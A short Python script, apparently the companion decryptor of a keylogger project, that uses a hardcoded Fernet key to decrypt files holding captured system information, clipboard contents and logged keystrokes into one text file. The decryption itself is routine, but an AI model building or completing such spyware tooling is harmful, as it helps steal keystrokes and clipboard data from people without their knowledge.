from cryptography.fernet import Fernet

key = "ha4eQPTZ8p_J7NoIg03ZS5zvAR095IzaJgVx7R4c9Ao="

system_information_e = 'sys_info_e.txt'
clipboard_information_e = 'clip_e.txt'
keys_information_e = 'key_log_e.txt'

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1
